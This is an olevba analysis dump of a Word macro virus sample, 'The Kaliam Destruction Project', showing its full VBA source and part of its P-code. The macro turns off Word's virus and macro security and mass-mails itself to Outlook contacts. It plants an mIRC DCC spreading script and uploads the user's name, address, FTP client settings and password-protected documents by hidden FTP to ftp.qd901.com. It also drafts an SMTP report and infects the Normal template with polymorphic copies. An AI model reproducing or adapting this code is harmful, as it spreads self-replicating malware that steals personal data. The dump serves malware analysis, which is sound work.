olevba 0.60.1.dev3 on Python 3.8.10 - http://decalage.info/python/oletools
===============================================================================
FILE: Virus.MSWord.Intended.KDP.b
Type: OLE
-------------------------------------------------------------------------------
VBA MACRO ThisDocument.cls 
in file: Virus.MSWord.Intended.KDP.b - OLE stream: 'Macros/VBA/ThisDocument'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
Private Sub Document_Open()
On Error Resume Next
'
' The Kaliam Destruction Project.
' Programmed in Bergen (NORWAY). 05/99.
' This is a research virus - DO NOT DISTRIBUTE.
'
Application.EnableCancelKey = wdDisabled
Options.VirusProtection = False
Options.SaveNormalPrompt = False
Randomize Timer
KDP = "QD901"
NormInstalled = False
ActInstalled = False
Set ActCarrier = ActiveDocument.VBProject.VBComponents(1).CodeModule
Set NormCarrier = NormalTemplate.VBProject.VBComponents(1).CodeModule

NI = NormalTemplate.VBProject.VBComponents(1).CodeModule.Lines(2, 1)
AI = ActiveDocument.VBProject.VBComponents(1).CodeModule.Lines(2, 1)

If UCase(NI) = "ON ERROR RESUME NEXT" Then NormInstalled = True
If UCase(AI) = "ON ERROR RESUME NEXT" Then ActInstalled = True

If NormInstalled = False Then
    Set Infection = NormCarrier
    Set Carrier = ActCarrier
Else
    Set Infection = ActCarrier
    Set Carrier = NormCarrier
End If

If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") <> "" Then
CommandBars("Macro").Controls("Security...").Enabled = False
System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security", "Level") = 1&
Else
CommandBars("Tools").Controls("Macro").Enabled = False
Options.ConfirmConversions = (1 - 1): Options.VirusProtection = (1 - 1): Options.SaveNormalPrompt = (1 - 1)
End If

DoEvents

Dim KDP-1, KDP-2, KDP-3
Set KDP-1 = CreateObject("Outlook.Application")
Set KDP-2 = KDP-1.GetNameSpace("MAPI")
If System.PrivateProfileString("", "HKEY_CURRENT_USER\Software\Microsoft\Office\", "KDP") <> "by QD901" Then
If KDP - 1 = "Outlook" Then
KDP-2.Logon "profile", "password"
    For y = 1 To KDP-2.AddressLists.Count
        Set AddyBook = KDP-2.AddressLists(y)
        x = 1
        Set KDP-3 = KDP-1.CreateItem(0)
        For oo = 1 To AddyBook.AddressEntries.Count
            Peep = AddyBook.AddressEntries(x)
            KDP-3.Recipients.Add Peep
        x = x + 1
        If x > 50 Then oo = AddyBook.AddressEntries.Count
     Next oo
     KDP-3.Subject = "(PRIORITY: TOP) Promised Document from " & Application.UserName
     KDP-3.Body = "I found this Microsoft Word document on the Internet. You really oughta read it!"
     KDP-3.Attachments.Add ActiveDocument.FullName
     KDP-3.Send
     Peep = ""
    Next Y
KDP-2.Logoff
End If

Close
Tr1 = Dir(CurDir & "\Script.ini", vbNormal)
Tr2 = UCase(Right(CurDir, 8))
Tr3 = Dir("C" & Chr(58) & "\mIRC", vbDirectory)

If Tr1 <> "" Then SDir = CurDir & "\Script.ini"
If Tr2 = "DOWNLOAD" Then SDir = CurDir & "\..\Script.ini"
If Tr3 <> "" Then SDir = "C" & Chr(58) & "\mIRC\Script.ini"

If SDir <> "" Then
    Open SDir For Output As #1
    Print #1, "n0=on 1" & Chr(59) & "JOIN" & Chr(59) & "#" & Chr(59) & "if ( $me != $nick ) { /dcc send $nick " & ThisDocument.FullName & " }"
    Close #1
End If

If Int(Rnd * 10) > 7 Then
MsgBox "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."
End If

DoEvents

WinPath = Environ("WINDIR")

If Application.Tasks.Exists("Sockets Window") = True And System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = "" Or System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date) Then
    With Application.FileSearch
            .FileName = "WS_FTP.ini"
            .LookIn = "C" & Chr(58) & "\"
            .SearchSubFolders = True
            .MatchTextExactly = True
            .FileType = msoFileTypeAllFiles
            .Execute
            WsPath = .FoundFiles(1)
    End With
       
    DoEvents
    
    If ActiveDocument.HasPassword = True Then BCK = True
    
    DoEvents
    Open WinPath & "\" & Application.UserInitials & ".dat" For Output As #10
    Print #10, Application.UserName
    Print #10, Application.UserAddress
    If BCK = True Then Print #10, ActiveDocument.FullName
    If WsPath <> "" Then Print #10, "WS_FTP"
    Close #10
    Open WinPath & "\Command.$$$" For Output As #8
    Print #8, "o ftp.qd901.com"
    Print #8, "User KDP"
    Print #8, "KDP"
    Print #8, "binary"
    Print #8, "put " & WinPath & "\" & Application.UserInitials & ".dat"
    If WsPath <> "" Then Print #8, "put " & WsPath
    If BCK = True Then Print #8, "put " & ActiveDocument.FullName
        Print #8, "quit"
    Close
    Shell WinPath & "\Command.com /c FTP.exe -n -s:" & WinPath & "\Command.$$$", vbHide
    System.PrivateProfileString("", "HKEY_CURRENT_USER\Software", "") = WeekDay(Date)
End If

    DoEvents

    Open WinPath & "\Send.dat" For Output As #1
    Print #1, "o mail@hotmail.com 25"
    Print #1, "quote HELO Anonymous"
    Print #1, "quote MAIL From: <The Kaliam Destruction Project>"
    Print #1, "quote RCPT To: qd901@hotmail.com"
    Print #1, "quote DATA"
    Print #1, "quote Subject" & Chr(58) & Application.UserName & "; " & Application.UserAddress & "; " & System.Country; ""
    Print #1, "quote Date" & Chr(58) & Date & " " & Time
    Print #1, "quote ."
    Print #1, "quote QUIT"
    Print #1, "quit"

If Int(Rnd * 10) > 7 Then
MsgBox "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."
End If

Open "C:\AutoExec.bat" For Append As #1
a = Int(Rnd * 50000)
Print #1, "Debug 9 2 " & a & "1"
Close #1

For x = 1 To ThisDocument.Variables.Count
    ThisDocument.Variables(x).Delete
Next x
For x = 1 To Normal.ThisDocument.Variables.Count
    Normal.ThisDocument.Variables(x).Delete
Next x

With Carrier
    UECode = .Lines(1, 2) & Chr(13)
    For x = 5 To .CountOfLines - 1
        VCCode = .Lines(x, 1)
        If VCCode = "End Sub" Then Exit For
        For i = 1 To 20
            If Mid(VCCode, i, 1) = ":" Then VCCode = Right(VCCode, Len(VCCode) - i)
        Next i
        factor = ""
        For Y = 1 To Int(Rnd * 6) + 6
            factor = factor & Chr(Int(Rnd * 25) + 65)
        Next Y
        make_morph = factor & ": "

        VirCode = VirCode & make_morph & " " & VCCode & Chr(13)
        If Int(Rnd * 10) > 7 Then VirCode = VirCode & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & " = " & Chr(58) & String(Int(Rnd * 6) + 1, Chr(Int(Rnd * 25) + 65)) & Chr(58) & Chr(13)
    Next x
    VirCode = UECode & VirCode & "End Sub"
End With

Normal.ThisDocument.Variables.Add "VCode", VirCode

ResetMe = "Private Sub Document_Close()" & Chr(13)
ResetMe = ResetMe & String(150, Chr(9)) & "If ShowVisualBasicEditor=True Then Exit sub: With ThisDocument.VBProject.VBComponents(1).CodeModule: .DeleteLines 1, .CountOfLines: .InsertLines 1, Normal.ThisDocument.Variables(1).Value: End With: ThisDocument.Save" & Chr(13)
ResetMe = ResetMe & "End Sub"

With ActCarrier
        .DeleteLines 1, .CountOfLines
        .InsertLines 1, ResetMe
End With

With NormCarrier
    .DeleteLines 1, .CountOfLines
    .InsertLines 1, ResetMe
End With

ActiveDocument.Save
NormalTemplate.Save

If Int(Rnd * 10) > 7 Then
MsgBox "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."
End If

Set KDP-4 = ActiveDocument.VBProject.VBComponents.Item(1)
Set KDP-5 = NormalTemplate.VBProject.VBComponents.Item(1)
NTCL = KDP-5.CodeModule.CountOfLines
ADCL = KDP-4.CodeModule.CountOfLines
BGN = 2
If KDP-4.Name <> "KDP" Then
If ADCL > 0 Then _
ADI1.CodeModule.DeleteLines 1, ADCL
Set ToInfect = KDP - 4
KDP-4.Name = "KDP"
DoAD = True
End If

If KDP-5.Name <> "KDP" Then
If NTCL > 0 Then _
KDP-5.CodeModule.DeleteLines 1, NTCL
Set ToInfect = KDP - 5
KDP-5.Name = "KDP"
DoNT = True
End If

If DoNT <> True And DoAD <> True Then GoTo Doom
If DoNT = True Then
Do While KDP-4.CodeModule.Lines(1, 1) = ""
KDP-4.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Close()")
Do While KDP-4.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, KDP-4.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If

If DoAD = True Then
Do While KDP-5.CodeModule.Lines(1, 1) = ""
KDP-5.CodeModule.DeleteLines 1
Loop
ToInfect.CodeModule.AddFromString ("Private Sub Document_Open()")
Do While KDP-5.CodeModule.Lines(BGN, 1) <> ""
ToInfect.CodeModule.InsertLines BGN, KDP-5.CodeModule.Lines(BGN, 1)
BGN = BGN + 1
Loop
End If

Doom:
If NTCL <> 0 And ADCL = 0 And (InStr(1, ActiveDocument.Name, "Document") = False) Then
ActiveDocument.SaveAs FileName:=ActiveDocument.FullName
ElseIf (InStr(1, ActiveDocument.Name, "Document") <> False) Then
ActiveDocument.Saved = True: End If
If Day(Now) = Minute(Now) Then Selection.TypeText "The Kaliam Destruction Project." & Chr(13) & "Programmed in Bergen (NORWAY). 05/99." & Chr(13) & "This is a research virus - DO NOT DISTRIBUTE."

End Sub
-------------------------------------------------------------------------------
VBA MACRO VBA_P-code.txt 
in file: VBA P-code - OLE stream: 'VBA P-code'
- - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - - 
' Processing file: Virus.MSWord.Intended.KDP.b
' ===============================================================================
' Module streams:
' Macros/VBA/ThisDocument - 15688 bytes
' Line #0:
' 	FuncDefn (Private Sub Document_Open())
' Line #1:
' 	OnError (Resume Next) 
' Line #2:
' 	QuoteRem 0x0000 0x0000 ""
' Line #3:
' 	QuoteRem 0x0000 0x0020 " The Kaliam Destruction Project."
' Line #4:
' 	QuoteRem 0x0000 0x0026 " Programmed in Bergen (NORWAY). 05/99."
' Line #5:
' 	QuoteRem 0x0000 0x002E " This is a research virus - DO NOT DISTRIBUTE."
' Line #6:
' 	QuoteRem 0x0000 0x0000 ""
' Line #7:
' 	Ld wdDisabled 
' 	Ld Application 
' 	MemSt EnableCancelKey 
' Line #8:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt VirusProtection 
' Line #9:
' 	LitVarSpecial (False)
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #10:
' 	Ld Timer 
' 	ArgsCall Read 0x0001 
' Line #11:
' 	LitStr 0x0005 "QD901"
' 	St KDP 
' Line #12:
' 	LitVarSpecial (False)
' 	St NormInstalled 
' Line #13:
' 	LitVarSpecial (False)
' 	St ActInstalled 
' Line #14:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set ActCarrier 
' Line #15:
' 	SetStmt 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	Set NormCarrier 
' Line #16:
' Line #17:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld NormalTemplate 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St NI 
' Line #18:
' 	LitDI2 0x0002 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Ld ActiveDocument 
' 	MemLd VBProject 
' 	ArgsMemLd VBComponents 0x0001 
' 	MemLd CodeModule 
' 	ArgsMemLd Lines 0x0002 
' 	St AI 
' Line #19:
' Line #20:
' 	Ld NI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St NormInstalled 
' 	EndIf 
' Line #21:
' 	Ld AI 
' 	ArgsLd UCase 0x0001 
' 	LitStr 0x0014 "ON ERROR RESUME NEXT"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St ActInstalled 
' 	EndIf 
' Line #22:
' Line #23:
' 	Ld NormInstalled 
' 	LitVarSpecial (False)
' 	Eq 
' 	IfBlock 
' Line #24:
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Infection 
' Line #25:
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Carrier 
' Line #26:
' 	ElseBlock 
' Line #27:
' 	SetStmt 
' 	Ld ActCarrier 
' 	Set Infection 
' Line #28:
' 	SetStmt 
' 	Ld NormCarrier 
' 	Set Carrier 
' Line #29:
' 	EndIfBlock 
' Line #30:
' Line #31:
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #32:
' 	LitVarSpecial (False)
' 	LitStr 0x000B "Security..."
' 	LitStr 0x0005 "Macro"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #33:
' 	LitDI4 0x0001 0x0000 
' 	LitStr 0x0000 ""
' 	LitStr 0x003D "HKEY_CURRENT_USER\Software\Microsoft\Office\9.0\Word\Security"
' 	LitStr 0x0005 "Level"
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #34:
' 	ElseBlock 
' Line #35:
' 	LitVarSpecial (False)
' 	LitStr 0x0005 "Macro"
' 	LitStr 0x0005 "Tools"
' 	ArgsLd CommandBars 0x0001 
' 	ArgsMemLd Controls 0x0001 
' 	MemSt Enabled 
' Line #36:
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt ConfirmConversions 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt VirusProtection 
' 	BoS 0x0000 
' 	LitDI2 0x0001 
' 	LitDI2 0x0001 
' 	Sub 
' 	Paren 
' 	Ld Options 
' 	MemSt SaveNormalPrompt 
' Line #37:
' 	EndIfBlock 
' Line #38:
' Line #39:
' 	ArgsCall DoEvents 0x0000 
' Line #40:
' Line #41:
' 	Reparse 0x0017 "Dim KDP-1, KDP-2, KDP-3"
' Line #42:
' 	Reparse 0x002F "Set KDP-1 = CreateObject("Outlook.Application")"
' Line #43:
' 	Reparse 0x0026 "Set KDP-2 = KDP-1.GetNameSpace("MAPI")"
' Line #44:
' 	LitStr 0x0000 ""
' 	LitStr 0x002C "HKEY_CURRENT_USER\Software\Microsoft\Office\"
' 	LitStr 0x0003 "KDP"
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0008 "by QD901"
' 	Ne 
' 	IfBlock 
' Line #45:
' 	Ld KDP 
' 	LitDI2 0x0001 
' 	Sub 
' 	LitStr 0x0007 "Outlook"
' 	Eq 
' 	IfBlock 
' Line #46:
' 	Reparse 0x0021 "KDP-2.Logon "profile", "password""
' Line #47:
' 	Reparse 0x0029 "    For y = 1 To KDP-2.AddressLists.Count"
' Line #48:
' 	Reparse 0x002C "        Set AddyBook = KDP-2.AddressLists(y)"
' Line #49:
' 	LitDI2 0x0001 
' 	St x 
' Line #50:
' 	Reparse 0x0027 "        Set KDP-3 = KDP-1.CreateItem(0)"
' Line #51:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	LitDI2 0x0001 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	For 
' Line #52:
' 	Ld x 
' 	Ld AddyBook 
' 	ArgsMemLd AddressEntries 0x0001 
' 	St Peep 
' Line #53:
' 	Reparse 0x0025 "            KDP-3.Recipients.Add Peep"
' Line #54:
' 	Ld x 
' 	LitDI2 0x0001 
' 	Add 
' 	St x 
' Line #55:
' 	Ld x 
' 	LitDI2 0x0032 
' 	Gt 
' 	If 
' 	BoSImplicit 
' 	Ld AddyBook 
' 	MemLd AddressEntries 
' 	MemLd Count 
' 	St oo 
' 	EndIf 
' Line #56:
' 	StartForVariable 
' 	Ld oo 
' 	EndForVariable 
' 	NextVar 
' Line #57:
' 	Reparse 0x0055 "     KDP-3.Subject = "(PRIORITY: TOP) Promised Document from " & Application.UserName"
' Line #58:
' 	Reparse 0x0064 "     KDP-3.Body = "I found this Microsoft Word document on the Internet. You really oughta read it!""
' Line #59:
' 	Reparse 0x0032 "     KDP-3.Attachments.Add ActiveDocument.FullName"
' Line #60:
' 	Reparse 0x000F "     KDP-3.Send"
' Line #61:
' 	LitStr 0x0000 ""
' 	St Peep 
' Line #62:
' 	StartForVariable 
' 	Ld Y 
' 	EndForVariable 
' 	NextVar 
' Line #63:
' 	Reparse 0x000C "KDP-2.Logoff"
' Line #64:
' 	EndIfBlock 
' Line #65:
' Line #66:
' 	CloseAll 
' Line #67:
' 	Ld CurDir 
' 	LitStr 0x000B "\Script.ini"
' 	Concat 
' 	Ld vbNormal 
' 	ArgsLd Dir 0x0002 
' 	St Tr1 
' Line #68:
' 	Ld CurDir 
' 	LitDI2 0x0008 
' 	ArgsLd Right 0x0002 
' 	ArgsLd UCase 0x0001 
' 	St Tr2 
' Line #69:
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0005 "\mIRC"
' 	Concat 
' 	Ld vbDirectory 
' 	ArgsLd Dir 0x0002 
' 	St Tr3 
' Line #70:
' Line #71:
' 	Ld Tr1 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000B "\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #72:
' 	Ld Tr2 
' 	LitStr 0x0008 "DOWNLOAD"
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	Ld CurDir 
' 	LitStr 0x000E "\..\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #73:
' 	Ld Tr3 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0010 "\mIRC\Script.ini"
' 	Concat 
' 	St SDir 
' 	EndIf 
' Line #74:
' Line #75:
' 	Ld SDir 
' 	LitStr 0x0000 ""
' 	Ne 
' 	IfBlock 
' Line #76:
' 	Ld SDir 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #77:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "n0=on 1"
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0004 "JOIN"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "#"
' 	Concat 
' 	LitDI2 0x003B 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0026 "if ( $me != $nick ) { /dcc send $nick "
' 	Concat 
' 	Ld ThisDocument 
' 	MemLd FullName 
' 	Concat 
' 	LitStr 0x0002 " }"
' 	Concat 
' 	PrintItemNL 
' Line #78:
' 	LitDI2 0x0001 
' 	Sharp 
' 	Close 0x0001 
' Line #79:
' 	EndIfBlock 
' Line #80:
' Line #81:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	IfBlock 
' Line #82:
' 	LitStr 0x001F "The Kaliam Destruction Project."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "Programmed in Bergen (NORWAY). 05/99."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002D "This is a research virus - DO NOT DISTRIBUTE."
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #83:
' 	EndIfBlock 
' Line #84:
' Line #85:
' 	ArgsCall DoEvents 0x0000 
' Line #86:
' Line #87:
' 	LitStr 0x0006 "WINDIR"
' 	ArgsLd Environ 0x0001 
' 	St WinPath 
' Line #88:
' Line #89:
' 	LitStr 0x000E "Sockets Window"
' 	Ld Application 
' 	MemLd Tasks 
' 	ArgsMemLd Exists 0x0001 
' 	LitVarSpecial (True)
' 	Eq 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	LitStr 0x0000 ""
' 	Eq 
' 	And 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemLd PrivateProfileString 0x0003 
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	Eq 
' 	Or 
' 	IfBlock 
' Line #90:
' 	StartWithExpr 
' 	Ld Application 
' 	MemLd FileSearch 
' 	With 
' Line #91:
' 	LitStr 0x000A "WS_FTP.ini"
' 	MemStWith FileName 
' Line #92:
' 	LitStr 0x0001 "C"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	MemStWith LookIn 
' Line #93:
' 	LitVarSpecial (True)
' 	MemStWith SearchSubFolders 
' Line #94:
' 	LitVarSpecial (True)
' 	MemStWith MatchTextExactly 
' Line #95:
' 	Ld msoFileTypeAllFiles 
' 	MemStWith FileType 
' Line #96:
' 	ArgsMemCallWith Execute 0x0000 
' Line #97:
' 	LitDI2 0x0001 
' 	ArgsMemLdWith FoundFiles 0x0001 
' 	St WsPath 
' Line #98:
' 	EndWith 
' Line #99:
' Line #100:
' 	ArgsCall DoEvents 0x0000 
' Line #101:
' Line #102:
' 	Ld ActiveDocument 
' 	MemLd HasPassword 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitVarSpecial (True)
' 	St BCK 
' 	EndIf 
' Line #103:
' Line #104:
' 	ArgsCall DoEvents 0x0000 
' Line #105:
' 	Ld WinPath 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	LitDI2 0x000A 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #106:
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserName 
' 	PrintItemNL 
' Line #107:
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld Application 
' 	MemLd UserAddress 
' 	PrintItemNL 
' Line #108:
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	PrintItemNL 
' 	EndIf 
' Line #109:
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x000A 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "WS_FTP"
' 	PrintItemNL 
' 	EndIf 
' Line #110:
' 	LitDI2 0x000A 
' 	Sharp 
' 	Close 0x0001 
' Line #111:
' 	Ld WinPath 
' 	LitStr 0x000C "\Command.$$$"
' 	Concat 
' 	LitDI2 0x0008 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #112:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000F "o ftp.qd901.com"
' 	PrintItemNL 
' Line #113:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0008 "User KDP"
' 	PrintItemNL 
' Line #114:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0003 "KDP"
' 	PrintItemNL 
' Line #115:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0006 "binary"
' 	PrintItemNL 
' Line #116:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld WinPath 
' 	Concat 
' 	LitStr 0x0001 "\"
' 	Concat 
' 	Ld Application 
' 	MemLd UserInitials 
' 	Concat 
' 	LitStr 0x0004 ".dat"
' 	Concat 
' 	PrintItemNL 
' Line #117:
' 	Ld WsPath 
' 	LitStr 0x0000 ""
' 	Ne 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld WsPath 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #118:
' 	Ld BCK 
' 	LitVarSpecial (True)
' 	Eq 
' 	If 
' 	BoSImplicit 
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "put "
' 	Ld ActiveDocument 
' 	MemLd FullName 
' 	Concat 
' 	PrintItemNL 
' 	EndIf 
' Line #119:
' 	LitDI2 0x0008 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #120:
' 	CloseAll 
' Line #121:
' 	Ld WinPath 
' 	LitStr 0x001E "\Command.com /c FTP.exe -n -s:"
' 	Concat 
' 	Ld WinPath 
' 	Concat 
' 	LitStr 0x000C "\Command.$$$"
' 	Concat 
' 	Ld vbHide 
' 	ArgsCall Shell 0x0002 
' Line #122:
' 	Ld Date 
' 	ArgsLd WeekDay 0x0001 
' 	LitStr 0x0000 ""
' 	LitStr 0x001A "HKEY_CURRENT_USER\Software"
' 	LitStr 0x0000 ""
' 	Ld System 
' 	ArgsMemSt PrivateProfileString 0x0003 
' Line #123:
' 	EndIfBlock 
' Line #124:
' Line #125:
' 	ArgsCall DoEvents 0x0000 
' Line #126:
' Line #127:
' 	Ld WinPath 
' 	LitStr 0x0009 "\Send.dat"
' 	Concat 
' 	LitDI2 0x0001 
' 	Sharp 
' 	LitDefault 
' 	Open (For Output)
' Line #128:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0015 "o mail@hotmail.com 25"
' 	PrintItemNL 
' Line #129:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0014 "quote HELO Anonymous"
' 	PrintItemNL 
' Line #130:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0031 "quote MAIL From: <The Kaliam Destruction Project>"
' 	PrintItemNL 
' Line #131:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0020 "quote RCPT To: qd901@hotmail.com"
' 	PrintItemNL 
' Line #132:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "quote DATA"
' 	PrintItemNL 
' Line #133:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000D "quote Subject"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Application 
' 	MemLd UserName 
' 	Concat 
' 	LitStr 0x0002 "; "
' 	Concat 
' 	Ld Application 
' 	MemLd UserAddress 
' 	Concat 
' 	LitStr 0x0002 "; "
' 	Concat 
' 	Ld System 
' 	MemLd Country 
' 	Concat 
' 	PrintItemSemi 
' 	LitStr 0x0000 ""
' 	PrintItemNL 
' Line #134:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "quote Date"
' 	LitDI2 0x003A 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	Ld Date 
' 	Concat 
' 	LitStr 0x0001 " "
' 	Concat 
' 	Ld Time 
' 	Concat 
' 	PrintItemNL 
' Line #135:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0007 "quote ."
' 	PrintItemNL 
' Line #136:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x000A "quote QUIT"
' 	PrintItemNL 
' Line #137:
' 	LitDI2 0x0001 
' 	Sharp 
' 	PrintChan 
' 	LitStr 0x0004 "quit"
' 	PrintItemNL 
' Line #138:
' Line #139:
' 	Ld Rnd 
' 	LitDI2 0x000A 
' 	Mul 
' 	FnInt 
' 	LitDI2 0x0007 
' 	Gt 
' 	IfBlock 
' Line #140:
' 	LitStr 0x001F "The Kaliam Destruction Project."
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x0025 "Programmed in Bergen (NORWAY). 05/99."
' 	Concat 
' 	LitDI2 0x000D 
' 	ArgsLd Chr 0x0001 
' 	Concat 
' 	LitStr 0x002D "This is a research virus - DO NOT DISTRIBUTE."
' 	Concat 
' 	ArgsCall MsgBox 0x0001 
' Line #141:
' 	EndIfBlock 
' Line #142:
' Line #143:
